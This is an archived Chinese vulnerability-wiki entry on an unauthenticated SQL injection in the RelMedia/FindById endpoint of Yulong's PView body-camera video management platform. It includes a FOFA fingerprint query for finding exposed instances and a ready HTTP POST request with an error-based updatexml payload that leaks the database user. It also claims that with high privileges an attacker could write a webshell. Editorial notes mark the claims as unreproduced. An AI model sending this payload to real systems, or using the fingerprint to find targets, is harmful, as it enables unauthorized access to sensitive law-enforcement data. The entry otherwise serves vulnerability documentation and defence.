---
source: "wy876 漏洞文库"
identifier_role: "unknown"
primary_identifiers: ""
referenced_identifiers: ""
identifier_status: "unknown"
title: "誉龙数字执法记录仪管理平台FindById存在SQL注入漏洞"
product: "誉龙PView"
record_type: "unknown"
document_type: "技术文章（细分类待核）"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
prerequisites: "版本仅产品；仅user()报错请求无响应证据，写木马/系统权限为条件性后果不能当已证实；缺修复和认证配置说明"
side_effects: "原文技术操作的实际副作用未复现核验；按其请求/代码评估状态变更、凭据暴露和业务影响"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/%E5%85%B6%E4%BB%96%E8%BD%AF%E4%BB%B6/%E6%9D%82%E9%A1%B9/%E8%AA%89%E9%BE%99%E6%95%B0%E5%AD%97%E6%89%A7%E6%B3%95%E8%AE%B0%E5%BD%95%E4%BB%AA%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0FindById%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.md"
archive_commit: "41940cb0038d09ca5aaddbe5bffb923e423d210f"
source_status: "recorded"
source_note: "正文标注的原文链接；链接内容及权威性未在本次重新核验"
fofa: "body=\"PView 视音频管理平台\""
source_url: "https://www.yuque.com/xiaokp7/ocvun2/mnghcs7bfd52x86g"
id: "vw-ded2108824aca7ecc1056613"
entity_id: "ve-ded2108824aca7ecc1056613"
schema_version: "1"
previous_fofa_unverified: "body="
---

# 誉龙数字执法记录仪管理平台FindById存在SQL注入漏洞

> 指纹字段校订（2026-10-04）：本文原归档明确标为 FOFA 的完整表达式已记入 `fofa`；原残缺 `fofa_unverified` 值逐字保存在 `previous_fofa_unverified`。后文关于该字段残缺的旧说明只描述校订前状态。查询用于产品检索，不证明资产受影响。

<!-- vulwiki-editorial-rebuild:system-misc -->
## 条目范围与校订

- 本文对象：誉龙PView
- 文献类型：技术文章（细分类待核）
- 版本、权限及部署边界：版本仅产品；仅user()报错请求无响应证据，写木马/系统权限为条件性后果不能当已证实；缺修复和认证配置说明
- 核验状态：仅重建文本校订；未执行文中代码、PoC 或扫描，未把截图或转载声明记为本站复现

### 具体结论与待核项

以下为原归档的逐项勘误与证据缺口；可由文本确定的问题已在下文订正，仍缺来源的事实保持待核。

1. FOFA元数据body=截断
2. 版本仅产品
3. HTTP误标go
4. 仅user()报错请求无响应证据，写木马/系统权限为条件性后果不能当已证实
5. 缺修复和认证配置说明

### 操作风险

原文技术操作的实际副作用未复现核验；按其请求/代码评估状态变更、凭据暴露和业务影响

技术请求、代码与实验方法按原文保留；其中的破坏性动作仅限授权、可恢复的隔离环境。缺失代码、参数或版本事实不猜补。

### 来源追溯

- 原文标注出处：<https://www.yuque.com/xiaokp7/ocvun2/mnghcs7bfd52x86g>

### 归档技术正文

# 一、漏洞简介
誉龙数字执法记录仪管理平台是深圳誉龙数字技术有限公司开发的执法记录仪管理平台，誉龙视音频综合管理平台 RelMedia/FindById 存在SQL注入漏洞，未经身份验证的远程攻击者除了可以利用 SQL 注入漏洞获取数据库中的信息（例如，管理员后台密码、站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。

# 二、影响版本
+ 誉龙数字执法记录仪管理平台

# 三、资产测绘
+ fofa`body="PView 视音频管理平台"`
+ 特征


# 四、漏洞复现
```http
POST /index.php?r=RelMedia/FindById HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9
Connection: close
Content-Type: application/x-www-form-urlencoded
 
id=1+and+updatexml(1,concat(0x7e,user(),0x7e),1)--+
```


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/mnghcs7bfd52x86g>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
